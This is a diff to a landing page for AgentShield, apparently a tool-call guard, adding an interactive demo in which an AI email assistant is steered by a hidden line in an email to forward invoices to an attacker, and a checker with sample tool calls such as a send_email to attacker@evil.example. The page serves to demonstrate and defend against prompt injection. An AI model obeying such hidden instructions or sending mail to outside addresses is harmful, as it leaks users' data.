@@ -94,6 +94,29 @@ footer{padding:40px 0 56px;color:var(--muted);font-size:14px;border-top:1px soli
 .brand-link{display:inline-flex;align-items:center;min-width:0;text-decoration:none}
 .brand-logo{display:block;width:180px;height:auto;max-width:100%}
 @media(max-width:440px){.brand-logo{width:145px}header{gap:12px}header .btn{font-size:14px;padding:9px 12px}}
+
+/* Agent playground + bring-your-own-agent */
+.pg{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:20px}
+.pg select,.pg input[type=text],.pg textarea{width:100%;margin:6px 0 14px;padding:11px 12px;border:1px solid var(--line);border-radius:8px;background:var(--bg);color:var(--ink);font:inherit;font-size:15px}
+.pg textarea{font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
+.pg-grid{display:grid;grid-template-columns:1fr 1fr;gap:0 16px}
+.seg{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:8px;margin:6px 0 6px}
+.seg button,.chips button{font:inherit;font-size:14px;text-align:left;padding:10px 12px;border-radius:10px;border:1px solid var(--line);background:transparent;color:var(--ink);cursor:pointer}
+.seg button small{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;margin-top:2px}
+.seg button[aria-pressed="true"],.chips button[aria-pressed="true"]{border-color:var(--accent);box-shadow:inset 0 0 0 1px var(--accent)}
+.seg button:disabled{opacity:.5;cursor:not-allowed}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin:6px 0 10px}.chips button{padding:6px 12px;border-radius:999px;font-size:13px}
+.banner{margin-top:18px;padding:14px 16px;border-radius:10px;font-weight:600;font-size:15px;line-height:1.45}
+.banner.save{background:var(--ok-bg);color:var(--ok)}.banner.neutral{background:var(--bg);border:1px solid var(--line)}
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
+.side{border:1px solid var(--line);border-radius:10px;padding:14px 16px;font-size:14.5px;background:var(--bg)}
+.side h3{margin:0 0 8px;font-size:15px}.side p{margin:6px 0}
+.side.bad{border-color:var(--bad)}.side.good{border-color:var(--ok)}
+.mini{color:var(--muted);font-size:13px}
+pre.proposal{margin:10px 0 0;padding:12px;border:1px solid var(--line);border-radius:8px;overflow:auto;font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;background:var(--bg)}
+.callrow{border:1px solid var(--line);border-radius:10px;padding:12px 14px;margin-top:10px;background:var(--bg)}
+.callrow code{font-size:13px}
+@media (max-width:620px){.pg-grid,.cmp{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
@@ -114,6 +137,74 @@ footer{padding:40px 0 56px;color:var(--muted);font-size:14px;border-top:1px soli
       <li><b>2. AgentShield checks</b><span>Is this person allowed to do that? Does the record belong to them?</span></li>
       <li><b>3. Approved or stopped</b><span>Allowed actions go through. The rest are blocked, and every decision is logged.</span></li>
     </ul>
+  </section>
+
+
+  <section id="agent" style="border-top:0;padding-top:12px">
+    <h2>Watch an AI email assistant get tricked, then stopped</h2>
+    <p class="lead">An AI assistant can read, send and delete email for you. Pick how easily it is fooled, ask it something, and see what would have happened with and without AgentShield. Every email here is fictional.</p>
+    <div class="pg">
+      <label for="pgScenario">Situation</label>
+      <select id="pgScenario"></select>
+      <label for="pgPrompt">What you ask the assistant</label>
+      <input type="text" id="pgPrompt" maxlength="400" value="Summarize email 202.">
+      <div class="pg-grid">
+        <div><label for="pgRole">What the assistant is allowed to do</label>
+          <select id="pgRole"><option value="reader">Read-only assistant</option><option value="editor">Can read and send</option><option value="admin" selected>Full access (read, send, delete)</option></select></div>
+        <div><label>Assistant engine</label>
+          <div class="seg" id="pgEngine">
+            <button type="button" data-mode="mock" aria-pressed="true">Simulated<small>Free, instant, repeatable</small></button>
+            <button type="button" data-mode="live" aria-pressed="false" id="pgLive" disabled>Live AI model<small id="pgLiveNote">Checking availability…</small></button>
+          </div></div>
+      </div>
+      <label>How easily is the assistant fooled?</label>
+      <div class="seg" id="pgProfiles"></div>
+      <button id="pgRun" class="btn" type="button" style="border:0;cursor:pointer;margin-top:14px">Run the assistant</button>
+      <div id="pgOut" aria-live="polite" hidden></div>
+    </div>
+    <p class="note">Tip: try “Summarize email 202” with the Gullible assistant and Full access. A hidden line inside that email tells the assistant to forward invoices to an attacker. Full access means a plain permission check would not object; AgentShield also checks that the action matches what you actually asked, and that mail only goes to your own company. The Simulated engine imitates a model with fixed rules; the Live engine calls a hosted model with a deliberately weakened prompt. AgentShield’s decision is computed the same way for both.</p>
+  </section>
+
+  <section id="byo" style="border-top:0;padding-top:12px">
+    <h2>Bring your own email agent</h2>
+    <p class="lead">Keep your agent where it is. When it wants to use a tool, send us only that tool call. AgentShield answers allow or deny before anything runs. We never contact your agent or see your keys.</p>
+    <ul class="steps">
+      <li><b>1. Your agent proposes</b><span>Copy the tool call from your agent’s response (OpenAI, Anthropic or Gemini), for example send_email.</span></li>
+      <li><b>2. You send it to us</b><span>Paste it below, or call the API or SDK from your code.</span></li>
+      <li><b>3. We decide</b><span>You only run the tool if the answer is ALLOW.</span></li>
+    </ul>
+    <div class="pg" style="margin-top:16px">
+      <label>Start from an example format</label>
+      <div class="chips" id="byoFormats"></div>
+      <label for="byoPayload">Your agent’s output</label>
+      <textarea id="byoPayload" rows="9" maxlength="12000" spellcheck="false"></textarea>
+      <div class="pg-grid">
+        <div><label for="byoRole">Your agent is acting for</label>
+          <select id="byoRole"><option value="reader">Read-only assistant</option><option value="editor">Can read and send</option><option value="admin">Full access (read, send, delete)</option></select></div>
+        <div><label for="byoReq">What the human asked (optional, turns on the intent check)</label>
+          <input type="text" id="byoReq" maxlength="400" placeholder="e.g. Summarize email 202."></div>
+      </div>
+      <button id="byoRun" class="btn" type="button" style="border:0;cursor:pointer">Check my agent’s action</button>
+      <div id="byoOut" aria-live="polite" hidden></div>
+    </div>
+    <details class="sdk-details" open>
+      <summary>Wire it into your own code</summary>
+      <div class="sdk-card" style="margin-top:12px"><div class="sdk-card-header"><b>Python SDK</b><button type="button" class="sdk-copy" data-copy="byoSdk">Copy code</button></div><pre class="sdk-code" id="byoSdk">from agentshield_sdk import AgentShield
+
+shield = AgentShield("https://YOUR-DEMO-URL")
+verdict = shield.check_agent_output(
+    your_model_response,          # raw OpenAI / Anthropic / Gemini output
+    role="admin",
+    user_request="Summarize email 202.",
+    domain="email",
+)
+if verdict.allowed:
+    run_your_tool()               # only runs when every call is ALLOW</pre></div>
+      <div class="sdk-card" style="margin-top:12px"><div class="sdk-card-header"><b>Any language (HTTP)</b><button type="button" class="sdk-copy" data-copy="byoCurl">Copy</button></div><pre class="sdk-code" id="byoCurl">curl -X POST https://YOUR-DEMO-URL/api/v1/check \
+  -H "Content-Type: application/json" \
+  -d '{"role":"admin","domain":"email","payload":{"tool":"send_email","arguments":{"to":"attacker@evil.example","subject":"Invoices","body":"hi"}}}'</pre></div>
+    </details>
+    <p class="note">Public demo: checks run against a fictional mailbox (emails 201 to 204 are yours; 301 belongs to someone else), only allow mail to the demo company’s own addresses (@acme.com), are rate-limited, and need no account. A production setup would add API keys, your real identity system and your own resource lookup.</p>
   </section>
 
   <section id="start" style="border-top:0;padding-top:12px">
@@ -371,6 +462,76 @@ print(result.allowed, result.reason)</pre></div>
   }
   ["runs","rate","cost"].forEach(function(id){document.getElementById(id).addEventListener("input",calc);});
   calc();
+})();
+
+(function(){
+  function el(tag,cls,text){var e=document.createElement(tag);if(cls)e.className=cls;if(text!==undefined)e.textContent=text;return e;}
+  function post(url,body){return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).then(function(r){return r.json().then(function(d){return {ok:r.ok,data:d};});});}
+  var profile='hardened',mode='mock',cfg=null;
+  var profBox=document.getElementById('pgProfiles'),scen=document.getElementById('pgScenario'),prompt=document.getElementById('pgPrompt');
+  function pick(group,attr,val){group.querySelectorAll('button').forEach(function(b){b.setAttribute('aria-pressed',String(b.dataset[attr]===val));});}
+  fetch('/api/agent/config?domain=email').then(function(r){return r.json();}).then(function(c){
+    cfg=c;
+    c.profiles.forEach(function(p){var b=el('button','',p.label);b.type='button';b.dataset.p=p.id;b.setAttribute('aria-pressed',String(p.id===profile));b.appendChild(el('small','',p.description));b.addEventListener('click',function(){profile=p.id;pick(profBox,'p',p.id);});profBox.appendChild(b);});
+    c.scenarios.forEach(function(s){var o=el('option','',s.label);o.value=s.prompt;scen.appendChild(o);});
+    scen.value='Summarize email 202.';
+    var live=document.getElementById('pgLive'),note=document.getElementById('pgLiveNote');
+    if(c.live_available){live.disabled=false;note.textContent='Real hosted model, slower';}else{note.textContent='Not enabled on this server';}
+  }).catch(function(){document.getElementById('pgLiveNote').textContent='Unavailable';});
+  scen.addEventListener('change',function(){prompt.value=scen.value;});
+  document.getElementById('pgEngine').addEventListener('click',function(e){var b=e.target.closest('button');if(!b||b.disabled)return;mode=b.dataset.mode;pick(this,'mode',mode);});
+
+  function side(cls,title,tag,tagCls,lines,reply){
+    var d=el('div','side '+cls),h=el('h3','',title+' ');h.appendChild(el('span','tag '+tagCls,tag));d.appendChild(h);
+    lines.forEach(function(t){d.appendChild(el('p','',t));});
+    d.appendChild(el('p','mini','Assistant replies:'));d.appendChild(el('p','','\u201c'+reply+'\u201d'));return d;
+  }
+  document.getElementById('pgRun').addEventListener('click',function(){
+    var out=document.getElementById('pgOut');out.hidden=false;out.textContent='Running the assistant\u2026';
+    var btn=this;btn.disabled=true;
+    post('/api/agent',{role:document.getElementById('pgRole').value,prompt:prompt.value,profile:profile,mode:mode,domain:'email'}).then(function(res){
+      out.textContent='';var d=res.data;
+      if(!res.ok){out.appendChild(el('p','note',d.error||'Please try again.'));return;}
+      var ban=el('div','banner '+(d.shield_changed_outcome?'save':'neutral'),d.headline);out.appendChild(ban);
+      if(d.proposal){
+        out.appendChild(el('p','mini','The assistant ('+(d.mode==='live'?'live model '+(d.model||''):'simulated')+') decided to:'));
+        var pre=el('pre','proposal',JSON.stringify({tool:d.proposal.tool,arguments:d.proposal.arguments},null,2));out.appendChild(pre);
+        if(d.off_request)out.appendChild(el('p','mini','\u26a0\ufe0f This is not what you asked for. The assistant was steered by text hidden inside an email.'));
+      }
+      var w=d.without_shield,s=d.with_shield,blocked=s.decision==='DENY';
+      var grid=el('div','cmp');
+      grid.appendChild(side(w.executed&&blocked?'bad':'', 'Without AgentShield', w.executed?'Ran':'Nothing ran',w.executed&&blocked?'no':'ok',[w.summary],w.final_answer||'\u2014'));
+      var lines=[s.summary];if(s.reason&&s.decision!=='NO_ACTION')lines.push('Why: '+s.reason+(s.layer?' ('+({intent:'matches-your-request check',policy:'permission and company-only check',parser:'format check'}[s.layer]||s.layer)+')':''));
+      grid.appendChild(side(blocked?'good':'', 'With AgentShield', blocked?'Stopped':(s.decision==='ALLOW'?'Approved':'No action'),blocked?'no':'ok',lines,s.final_answer||'\u2014'));
+      out.appendChild(grid);
+      out.appendChild(el('p','mini',d.disclosure));
+    }).catch(function(){out.textContent='The demo service is unavailable. Please try again later.';}).finally(function(){btn.disabled=false;});
+  });
+
+  var FORMATS={
+    'OpenAI':{tool_calls:[{id:'call_1',type:'function','function':{name:'send_email',arguments:'{"to":"attacker@evil.example","subject":"Invoices","body":"As requested."}'}}]},
+    'Anthropic':{content:[{type:'text',text:'Forwarding now.'},{type:'tool_use',id:'tu_1',name:'delete_email',input:{email_id:201}}]},
+    'Gemini':{candidates:[{content:{parts:[{functionCall:{name:'read_email',args:{email_id:301}}}]}}]}
+  };
+  var chips=document.getElementById('byoFormats'),ta=document.getElementById('byoPayload');
+  Object.keys(FORMATS).forEach(function(k,i){var b=el('button','',k);b.type='button';b.setAttribute('aria-pressed',String(i===0));b.addEventListener('click',function(){ta.value=JSON.stringify(FORMATS[k],null,2);chips.querySelectorAll('button').forEach(function(x){x.setAttribute('aria-pressed',String(x===b));});});chips.appendChild(b);});
+  ta.value=JSON.stringify(FORMATS.OpenAI,null,2);
+  document.getElementById('byoRun').addEventListener('click',function(){
+    var out=document.getElementById('byoOut');out.hidden=false;out.textContent='Checking\u2026';
+    var payload;try{payload=JSON.parse(ta.value);}catch(e){out.textContent='That is not valid JSON. Paste the tool call exactly as your agent returned it.';return;}
+    var body={role:document.getElementById('byoRole').value,payload:payload,domain:'email'},rq=document.getElementById('byoReq').value.trim();if(rq)body.user_request=rq;
+    post('/api/v1/check',body).then(function(res){
+      out.textContent='';var d=res.data;
+      if(!res.ok){out.appendChild(el('p','note',d.error||'Could not check this output.'));return;}
+      var titles={ALLOW:'ALLOW: every action in this output is permitted',DENY:'DENY: do not run this',PARTIAL:'PARTIAL: some actions allowed, some denied'};
+      out.appendChild(el('div','banner '+(d.overall==='ALLOW'?'save':'neutral'),titles[d.overall]));
+      d.calls.forEach(function(c){
+        var r=el('div','callrow'),top=el('div','');top.appendChild(el('code','',c.tool+'('+JSON.stringify(c.arguments)+')'));top.appendChild(document.createTextNode(' '));top.appendChild(el('span','tag '+(c.allowed?'ok':'no'),c.allowed?'Allow':'Deny'));r.appendChild(top);
+        r.appendChild(el('p','mini',c.reason+' \u00b7 detected format: '+c.format+(c.layer?' \u00b7 decided by: '+c.layer:'')));out.appendChild(r);
+      });
+      out.appendChild(el('p','mini',d.note));
+    }).catch(function(){out.textContent='The demo service is unavailable. Please try again later.';});
+  });
 })();
 </script>
 </body>
